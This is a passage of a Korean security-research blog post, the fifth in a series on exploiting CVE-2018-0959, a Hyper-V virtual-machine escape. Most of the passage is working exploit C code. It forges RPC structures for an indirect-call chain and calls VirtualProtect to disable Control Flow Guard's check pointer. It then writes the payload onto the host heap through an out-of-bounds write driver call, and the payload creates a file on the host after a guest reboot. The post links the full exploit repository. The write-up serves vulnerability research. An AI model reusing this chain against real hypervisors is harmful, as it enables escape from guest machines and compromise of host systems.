<h3 id="RPC-Structures"><a href="#RPC-Structures" class="headerlink" title="RPC Structures"></a>RPC Structures</h3><p><code>NdrServerCall2</code>&#xC5D0; &#xD544;&#xC694;&#xD55C; RPC &#xAD6C;&#xC870;&#xCCB4;&#xB4E4;&#xC744; &#xCD08;&#xAE30;&#xD654;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC785;&#xB2C8;&#xB2E4;. &#xD398;&#xC774;&#xB85C;&#xB4DC; &#xC0C1;&#xC5D0;&#xC11C; &#xB178;&#xB4DC;&#xBCF4;&#xB2E4; &#xB4A4;&#xC5D0; &#xC704;&#xCE58;&#xD569;&#xB2C8;&#xB2E4;. &#xAC04;&#xC811; &#xD638;&#xCD9C; &#xB8E8;&#xD504;&#xB97C; &#xC2DC;&#xC791;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; <code>_listChanges</code>&#xB97C; 1&#xBC88;&#xC9F8; &#xB178;&#xB4DC;&#xB85C; &#xC124;&#xC815;&#xD558;&#xACE0; &#xB9C8;&#xC9C0;&#xB9C9; &#xB178;&#xB4DC;&#xC5D0;&#xC11C;&#xB294; &#xCCAB; &#xBC88;&#xC9F8; &#xB178;&#xB4DC;&#xC758; <code>_LIST_ENTRY</code>&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xAC8C; &#xB9CC;&#xB4E4;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs C">pRpcMsg = payload;
pRpcMsg-&gt;Buffer = (__int64)pRpcMsg-&gt;Buffer | (<span class="hljs-number">0x7</span> &lt;&lt; <span class="hljs-number">0x18</span>);<span class="hljs-comment">// for vm::onprepare&apos;s error check</span>
VideoDirtListenerOffset[<span class="hljs-number">0xb8</span>/<span class="hljs-number">0x8</span>] = start + <span class="hljs-number">0x150</span>;<span class="hljs-comment">//init _listChanges</span>
node = payload + <span class="hljs-number">0x100</span> * <span class="hljs-number">3</span>;<span class="hljs-comment">//last indirect call loop</span>
node[<span class="hljs-number">0x58</span> / <span class="hljs-number">8</span>] = start + <span class="hljs-number">0xb0</span>;<span class="hljs-comment">//escape loop</span>


<span class="hljs-keyword">char</span>* trailer = payload + <span class="hljs-number">0x100</span> * INDIRECT_CALL_CHAIN_LEN;
__int64* indirectCallTable = trailer, * buffer = <span class="hljs-literal">NULL</span>;
MIDL_STUB_DESC *pDesc = (PMIDL_STUB_DESC) (indirectCallTable + INDIRECT_CALL_CHAIN_LEN);



pDesc-&gt;pMallocFreeStruct = <span class="hljs-number">0</span>;
pDesc-&gt;Version = <span class="hljs-number">0xb000</span>;

pMidl = (PMIDL_SERVER_INFO)(pDesc + <span class="hljs-number">1</span>);
pMidl-&gt;DispatchTable = DispatchTable;
pMidl-&gt;ProcString = ProcStringAddress;<span class="hljs-comment">//vaild address</span>
pMidl-&gt;FmtStringOffset = FmtStringOffsetAddress;<span class="hljs-comment">//vaild address</span>
pMidl-&gt;pStubDesc = MidlStubDesc;<span class="hljs-comment">//vaild address</span>
pMidl-&gt;ThunkTable = <span class="hljs-literal">NULL</span>;

pServerInterface = (PRPC_SERVER_INTERFACE)(pMidl + <span class="hljs-number">1</span>);
pServerInterface-&gt;InterpreterInfo = MidlSrvInfo;
pServerInterface-&gt;Flags = <span class="hljs-number">0</span>;<span class="hljs-comment">//to avoid NdrStubCall2 line 354&apos;s branch</span>

<span class="hljs-built_in">memcpy</span>(payload + (vftable - VideoDirtListener), VideoDirtListenerEntries, <span class="hljs-number">8</span> * ENTRY_LEN);</code></pre>
<h3 id="Setting-Arguments"><a href="#Setting-Arguments" class="headerlink" title="Setting Arguments"></a>Setting Arguments</h3><p><code>DispatchTable</code>&#xC5D0; &#xD638;&#xCD9C;&#xB420; &#xD568;&#xC218;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xACE0; &#xB178;&#xB4DC; &#xBCC4;&#xB85C; &#xBC84;&#xD37C;&#xC5D0; &#xD638;&#xCD9C;&#xB420; &#xD568;&#xC218;&#xC758; &#xC778;&#xC790;&#xB97C; &#xC124;&#xC815;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.<br><pre><code class="hljs C">



<span class="hljs-comment">//avoid Exception NdrStubCall2 &amp; NdrpServerUnmarshal</span>
<span class="hljs-comment">//NdrStubCall2 line 417</span>
<span class="hljs-comment">//NdrpServerUnMarshal line 411</span>
indirectCallTable[<span class="hljs-number">19</span>] = KernelBase_VirtualProtect;

<span class="hljs-comment">//call VirtualProtect(rpcrt4!_guard_check_icall_fptr, 0x8, 0x4, `some writable address`);</span>
indirectCallTable[<span class="hljs-number">1</span>] = KernelBase_VirtualProtect;

node = payload + <span class="hljs-number">1</span> * <span class="hljs-number">0x100</span>;
pRpcMsg = node;
pRpcMsg-&gt;ManagerEpv = <span class="hljs-literal">NULL</span>;
pRpcMsg-&gt;RpcFlags = <span class="hljs-number">0x1000</span> | <span class="hljs-number">0x10000000</span> | <span class="hljs-number">0x20000000</span>;
buffer = node + <span class="hljs-number">0x60</span>/<span class="hljs-number">0x8</span>;
buffer[<span class="hljs-number">0</span>] = rpcrt4_guard_check_icall_fptr;
buffer[<span class="hljs-number">1</span>] = <span class="hljs-number">0x8</span>;
buffer[<span class="hljs-number">2</span>] = <span class="hljs-number">0x4</span>;
buffer[<span class="hljs-number">3</span>] = pRpcMsg-&gt;Buffer;

<span class="hljs-comment">//call GetCopy</span>
indirectCallTable[<span class="hljs-number">2</span>] = combase + <span class="hljs-number">0xd9100</span>;
node = payload + <span class="hljs-number">2</span> * <span class="hljs-number">0x100</span>;
pRpcMsg = node;
pRpcMsg-&gt;ManagerEpv = <span class="hljs-literal">NULL</span>;
pRpcMsg-&gt;RpcFlags = <span class="hljs-number">0x1000</span> | <span class="hljs-number">0x10000000</span> | <span class="hljs-number">0x20000000</span>;
buffer = node + <span class="hljs-number">0x60</span>/<span class="hljs-number">0x8</span>;
buffer[<span class="hljs-number">0</span>] = (<span class="hljs-keyword">char</span>*)pRpcMsg-&gt;Buffer + <span class="hljs-number">0x18</span>;<span class="hljs-comment">//this</span>
buffer[<span class="hljs-number">1</span>] = rpcrt4_guard_check_icall_fptr;<span class="hljs-comment">//dest</span>
buffer[<span class="hljs-number">2</span>] = ret;
<span class="hljs-keyword">char</span>* pThis = &amp;buffer[<span class="hljs-number">3</span>];
*(<span class="hljs-keyword">int</span>*)&amp;pThis[<span class="hljs-number">0x14</span>] = <span class="hljs-number">0x8</span>;
*(__int64*)&amp;pThis[<span class="hljs-number">0x18</span>] = (<span class="hljs-keyword">char</span>*)pRpcMsg-&gt;Buffer + <span class="hljs-number">0x10</span> - <span class="hljs-number">4</span>;


<span class="hljs-comment">//call CreateFileA</span>
indirectCallTable[<span class="hljs-number">3</span>] = KernelBase + <span class="hljs-number">0x41700</span>;<span class="hljs-comment">//CreateFileA</span>
node = payload + <span class="hljs-number">3</span> * <span class="hljs-number">0x100</span>;
pRpcMsg = node;
pRpcMsg-&gt;ManagerEpv = <span class="hljs-literal">NULL</span>;
pRpcMsg-&gt;RpcFlags = <span class="hljs-number">0x1000</span> | <span class="hljs-number">0x10000000</span> | <span class="hljs-number">0x20000000</span>;
buffer = node + <span class="hljs-number">0x60</span>/<span class="hljs-number">0x8</span>;
buffer[<span class="hljs-number">0</span>] = (<span class="hljs-keyword">char</span>*)pRpcMsg-&gt;Buffer + <span class="hljs-number">0x8</span> * <span class="hljs-number">7</span>;<span class="hljs-comment">//file name</span>
buffer[<span class="hljs-number">1</span>] = GENERIC_READ | GENERIC_WRITE;<span class="hljs-comment">//desired access</span>
buffer[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;
buffer[<span class="hljs-number">3</span>] = <span class="hljs-number">0</span>;
buffer[<span class="hljs-number">4</span>] = CREATE_ALWAYS;
buffer[<span class="hljs-number">5</span>] = FILE_ATTRIBUTE_NORMAL;
buffer[<span class="hljs-number">6</span>] = <span class="hljs-literal">NULL</span>;
<span class="hljs-built_in">memcpy</span>(&amp;buffer[<span class="hljs-number">7</span>], <span class="hljs-string">&quot;C:\\Users\\Public\\Hackyboiz\0&quot;</span>, <span class="hljs-number">27</span>);


WriteInfo writeInfo = { <span class="hljs-number">0</span>, };

<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Offset Between FindVdl Buffer start and VideoDirtListener: %llx\n&quot;</span>, (<span class="hljs-keyword">char</span>*)VideoDirtListenerOffset - (<span class="hljs-keyword">char</span>*)FindVdl.buffer);

writeInfo.from = FindVdl.from + ((<span class="hljs-keyword">char</span>*)VideoDirtListenerOffset - (<span class="hljs-keyword">char</span>*)FindVdl.buffer);

writeInfo.from -= writeInfo.from % <span class="hljs-number">0x200</span>;

writeInfo.to = writeInfo.from + <span class="hljs-number">0x800</span>;
<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] FindVdl Buffer (%p~)\n[+] VideoDirtListener ptr: %p\n[+] Write from %x to %x\n&quot;</span>, FindVdl.buffer, VideoDirtListenerOffset, writeInfo.from, writeInfo.to);

writeInfo.buffer = (<span class="hljs-keyword">char</span>*)FindVdl.buffer + (writeInfo.from - FindVdl.from);

<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Write Payload on TargetHeap\n&quot;</span>);
<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Overwrite Range: Landpoint+0x%x ~ Landpoint+0x%x\n&quot;</span>, writeInfo.from, writeInfo.to);
DeviceIoControl(driver, CORRUPT_IOCTL, &amp;writeInfo, <span class="hljs-keyword">sizeof</span>(WriteInfo), <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);
<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Payload is Ready, Reboot Guest To Trigger Payload\n&quot;</span>);
</code></pre></p>
<h2 id="Trigger-Payload"><a href="#Trigger-Payload" class="headerlink" title="Trigger Payload"></a>Trigger Payload</h2><p>Exploit&#xC744; &#xC2E4;&#xD589;&#xD558;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xB178;&#xB4DC;&#xB4E4;&#xC758; &#xC8FC;&#xC18C;&#xB098; DLL &#xC8FC;&#xC18C; &#xB4F1;&#xC758; &#xC815;&#xBCF4;&#xAC00; &#xCD9C;&#xB825;&#xB418;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. OOB Write&#xB85C; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xC4F0;&#xB294; &#xAC83;&#xC774; &#xB05D;&#xB09C; &#xB2E4;&#xC74C; &#xAC00;&#xC0C1;&#xBA38;&#xC2E0;&#xC744; &#xC7AC;&#xBD80;&#xD305;&#xD558;&#xBA74; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xC5B4; <code>C:\User\Public</code> &#xBC11;&#xC5D0; &#xD30C;&#xC77C;&#xC774; &#xC0DD;&#xC131;&#xB420; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.<br><img src="/2023/10/30/pwndorei/newjeans-hyper-v-pt5/image8.png" srcset="/img/loading.gif" alt></p>
<p>&#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xC2DC;&#xC5F0; &#xC601;&#xC0C1;&#xC744; &#xBCF4;&#xC2DC;&#xC8E0;!</p>
<h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><iframe width="560" height="315" src="https://www.youtube.com/embed/LvtNtkAll84?si=VRM1u7HSuegWqPoW" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>

<p>&#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xAD00;&#xB828; &#xCF54;&#xB4DC;&#xB4E4;&#xC740; <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/pwndorei/CVE-2018-0959">&#xC5EC;&#xAE30;</a>&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD558;&#xC2E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<h1 id="Part-6-&#xC608;&#xACE0;"><a href="#Part-6-&#xC608;&#xACE0;" class="headerlink" title="Part 6 &#xC608;&#xACE0;"></a>Part 6 &#xC608;&#xACE0;</h1><p>&#xC774;&#xB85C;&#xC368; CVE-2018-0959&#xC758; &#xBD84;&#xC11D;&#xBD80;&#xD130; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xAE4C;&#xC9C0; &#xBAA8;&#xB450; &#xC54C;&#xC544;&#xBCF4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;! &#xD504;&#xB85C;&#xC81D;&#xD2B8; &#xCD08;&#xCC3D;&#xAE30;&#xC5D0; Hyper-V &#xC544;&#xD0A4;&#xD14D;&#xCC98; &#xACF5;&#xBD80;&#xD558;&#xB358;&#xAC8C; &#xC5CA;&#xADF8;&#xC81C; &#xAC19;&#xC740;&#xB370;&#x2026; &#xC815;&#xB9D0; &#xAE38;&#xACE0; &#xAE34; &#xC5EC;&#xC815;&#xC774;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC5EC;&#xAE30;&#xC11C; &#xB05D;&#xC774; &#xC544;&#xB2C8;&#xC8E0;! &#xB2E4;&#xC74C; &#xD30C;&#xD2B8;&#xBD80;&#xD134; &#xC800; &#xB300;&#xC2E0; L0ch&#xB2D8;&#xC774; CVE-2020-0917 &#xBD84;&#xC11D; &#xAE00;&#xB85C; &#xB3CC;&#xC544;&#xC62C; &#xC608;&#xC815;&#xC774;&#xB2C8; &#xB9CE;&#xC740; &#xAD00;&#xC2EC; &#xBD80;&#xD0C1;&#xB4DC;&#xB9BD;&#xB2C8;&#xB2E4;!</p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                <div class="post-meta mr-3">
                  <i class="iconfont icon-category"></i>
                  
                  <a class="hover-with-bg" href="/categories/Research/">Research</a>
                  
                </div>
                
                
                <div class="post-meta">
                  <i class="iconfont icon-tags"></i>
                  
                  <a class="hover-with-bg" href="/tags/vm-escape/">vm escape</a>
                  
                  <a class="hover-with-bg" href="/tags/pwndorei/">pwndorei</a>
                  
                  <a class="hover-with-bg" href="/tags/hyper-v/">hyper-v</a>
                  
                  <a class="hover-with-bg" href="/tags/hypervisor/">hypervisor</a>
                  
                  <a class="hover-with-bg" href="/tags/CVE-2018-0959/">CVE-2018-0959</a>
                  
                </div>
                
              </div>

              <div class="post-metas mb-3">
                <a class="hover-with-bg" style="display: flex;" href="/author">
                  <div class="link-avatar-page">
                    <img src="/img/profile_pwndorei.jpg" srcset="/img/loading.gif" alt="pwndorei">
                  </div>

                  <div class="link-text">
                    <div class="link-title">pwndorei</div>
                  </div>
                </a>
                <div class="link-text">
                  <div class="link-more">
                    <a href="/tags/pwndorei">
                      Read more
                      <i class="iconfont icon-arrowdown"></i>
                    </a>
                  </div>
                </div>
              </div>

              <hr>
              <!--<script data-ad-client="ca-pub-3672652207808168" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
              
              <!--  -->
              <p class="note note-warning">본 글은 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.ko" rel="external nofollow noopener noreferrer">CC BY-SA 4.0</a> 라이선스로 배포됩니다. 공유 또는 변경 시 반드시 출처를 남겨주시기 바랍니다.</p>
              
              
              
              <div class="post-prevnext row">
                <article class="post-prev col-6">
                  
                  
                  <a href="/2024/01/11/l0ch/2024-01-11/">
                    <i class="iconfont icon-arrowleft"></i>
                    <span class="hidden-mobile">[하루한줄] CVE-2023-48702: jellyfin의 UNC 경로를 통한 원격 코드 실행 취약점</span>
                    <span class="visible-mobile">Previous</span>
                  </a>
                  
                </article>
                <article class="post-next col-6">
                  
                  
                  <a href="/2023/10/22/pwndorei/newjeans-hyper-v-pt4/">
                    <span class="hidden-mobile">[Research] NewJeans' Hyper-V Part 4 - CVE-2018-0959 Exploit(1)</span>
                    <span class="visible-mobile">Next</span>
                    <i class="iconfont icon-arrowright"></i>
                  </a>
                  
                </article>
              </div>
              
            </div>
            
            <!-- Embed Section -->
            <div style="width: 100%; height: 210px; margin-bottom: 50px; overflow: hidden;">
              <iframe src="https://maily.so/hackyboiz/embed?src=embed" style="width: 100%; height: 100%; border: none;" frameborder="0"></iframe>
            </div>            

            
            <!-- Comments -->
            <article class="comments" id="comments">
              
              
  <div class="disqus" style="width:100%">
    <div id="disqus_thread"></div>
    <script type="text/javascript">
      var disqus_config = function () {
        this.page.url = 'https://hackyboiz.github.io/2023/10/30/pwndorei/newjeans-hyper-v-pt5/';
        this.page.identifier = '/2023/10/30/pwndorei/newjeans-hyper-v-pt5/';
      };
      function loadDisqus() {
        (function () {
          var d = document,
            s = d.createElement('script');
          s.src = '//' + 'hackyboiz' + '.disqus.com/embed.js';
          s.setAttribute('data-timestamp', new Date());
          (d.head || d.body).appendChild(s);
        })();
      }
      waitElementVisible('disqus_thread', loadDisqus);
    </script>
    <noscript>Please enable JavaScript to view the
      <a target="_blank" href="https://disqus.com/?ref_noscript" rel="external nofollow noopener noreferrer">comments powered by Disqus.</a>
    </noscript>
  </div>


            </article>
            
          </article>
        </div>
      </div>
    </div>
    
    <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
      <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div id="tocbot"></div>
</div>

    </div>
    
  </div>
</div>

<!-- Custom -->

    
  </main>

  
    <a id="scroll-top-button" href="#" role="button">
      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
    <div>
      <a href="https://hexo.io" target="_blank" rel="external nofollow noopener noreferrer"><span>Hexo</span></a>
      <i class="iconfont icon-love"></i>
      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="external nofollow noopener noreferrer">
        <span>Fluid</span></a>
    </div>
    

    

    
  </div>
</footer>

<!-- SCRIPTS -->
<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
<script src="/js/debouncer.js"></script>
<script src="/js/main.js"></script>

<!-- Plugins -->


  
    <script src="/js/lazyload.js"></script>
  



  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js"></script>
  <script src="/js/clipboard-use.js"></script>







  <script src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js"></script>
  <script>
    $(document).ready(function () {
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;

      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '#post-body',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        collapseDepth: 0,
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc').css('visibility', 'visible');
      }
    });
  </script>



  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "[Research] NewJeans' Hyper-V Part 5 - CVE-2018-0959 Exploit(2)&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script src="/js/local-search.js"></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      searchFunc(path, 'local-search-input', 'local-search-result');
      this.onclick = null
    }
  </script>



  <script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
  <link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">

  <script>
    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
      function () {
        var element = document.createElement('a');
        $(element).attr('data-fancybox', 'images');
        $(element).attr('href', $(this).attr('src'));
        $(this).wrap(element);
      }
    );
  </script>





  

  
    <!-- MathJax -->
    <script>
      MathJax = {
        tex: {
          inlineMath: [['$', '$'], ['\\(', '\\)']]
        },
        options: {
          renderActions: {
            findScript: [10, doc => {
              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
                const display = !!node.type.match(/; *mode=display/);
                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
                const text = document.createTextNode('');
                node.parentNode.replaceChild(text, node);
                math.start = { node: text, delim: '', n: 0 };
                math.end = { node: text, delim: '', n: 0 };
                doc.math.push(math);
              });
            }, '', false],
            insertedScript: [200, () => {
              document.querySelectorAll('mjx-container').forEach(node => {
                let target = node.parentNode;
                if (target.nodeName.toLowerCase() === 'li') {
                  target.parentNode.classList.add('has-jax');
                }
              });
            }, '', false]
          }
        }
      };
    </script>

    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>

  













  

  
    <!-- Google Analytics -->
    <script defer>
      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
      ga.l = +new Date;
      ga('create', 'UA-177243668-2', 'auto');
      ga('send', 'pageview');
    </script>
    <script async src="https://www.google-analytics.com/analytics.js"></script>
  

  
    <!-- Google gtag.js -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-177243668-2"></script>
    <script defer>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'UA-177243668-2');
    </script>
  

  

  

  





</body>
</html>
